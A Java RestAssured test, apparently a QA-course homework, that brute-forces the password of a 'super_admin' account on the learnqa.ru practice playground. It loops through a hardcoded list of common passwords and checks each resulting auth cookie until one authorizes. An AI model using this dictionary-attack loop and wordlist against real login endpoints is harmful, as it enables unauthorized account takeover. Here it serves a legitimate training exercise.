import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertNotEquals;

public class CorrectPassword {
    @Test
    public void testPassword() {
        List<String> passwordList = new ArrayList<>();
        passwordList.add("password");
        passwordList.add("123456");
        passwordList.add("12345678");
        passwordList.add("qwerty");
        passwordList.add("abc123");
        passwordList.add("monkey");
        passwordList.add("1234567");
        passwordList.add("letmein");
        passwordList.add("trustno1");
        passwordList.add("dragon");
        passwordList.add("baseball");
        passwordList.add("111111");
        passwordList.add("iloveyou");
        passwordList.add("master");
        passwordList.add("sunshine");
        passwordList.add("ashley");
        passwordList.add("bailey");
        passwordList.add("passw0rd");
        passwordList.add("shadow");
        passwordList.add("123123");
        passwordList.add("654321");
        passwordList.add("superman");
        passwordList.add("qazwsx");
        passwordList.add("michael");
        passwordList.add("Football");
        passwordList.add("password");
        passwordList.add("welcome");
        passwordList.add("jesus");
        passwordList.add("ninja");
        passwordList.add("mustang");
        passwordList.add("password1");
        passwordList.add("123456789");
        passwordList.add("adobe123[a]");
        passwordList.add("admin");
        passwordList.add("1234567890");
        passwordList.add("photoshop[a]");
        passwordList.add("1234");
        passwordList.add("12345");
        passwordList.add("princess");
        passwordList.add("azerty");
        passwordList.add("0");
        passwordList.add("access");
        passwordList.add("696969");
        passwordList.add("batman");
        passwordList.add("1qaz2wsx");
        passwordList.add("login");
        passwordList.add("qwertyuiop");
        passwordList.add("solo");
        passwordList.add("starwars");
        passwordList.add("121212");
        passwordList.add("flower");
        passwordList.add("hottie");
        passwordList.add("loveme");
        passwordList.add("zaq1zaq1");
        passwordList.add("hello");
        passwordList.add("freedom");
        passwordList.add("whatever");
        passwordList.add("666666");
        passwordList.add("!@#$%^&*");
        passwordList.add("charlie");
        passwordList.add("aa123456");
        passwordList.add("donald");
        passwordList.add("qwerty123");
        passwordList.add("1q2w3e4r");
        passwordList.add("555555");
        passwordList.add("lovely");
        passwordList.add("7777777");
        passwordList.add("888888");
        passwordList.add("123qwe");





        String[] passwords = passwordList.toArray(new String[0]);
        boolean isAuthorized = false;


        System.out.println(Arrays.toString(passwords));

        for (String password : passwords){

            System.out.println();

        Response response = RestAssured
                .given()
                .log().body()
                .body("login=super_admin&password="+ password)
                .when()
                .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                .andReturn();
        String responseCookie = response.getCookie("auth_cookie");
        System.out.print("запрашиваемый пароль: "+password);
        System.out.println("\nотправляемый токен: "+ responseCookie);


        Response response1 = RestAssured
                .given()
                .log().cookies()
                .cookies("auth_cookie",responseCookie)
                .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                .andReturn();

            String responseBody = response1.getBody().asString();
            response1.print();

            if (!responseBody.equals("You are NOT authorized")) {
                System.out.println("Правильный пароль: "+password);
                System.out.println("Ответ: "+responseBody);
                isAuthorized = true;
                break;
            }
        }
        if (!isAuthorized) {
            System.out.println("LOOSER!!!");
        }
    }
}
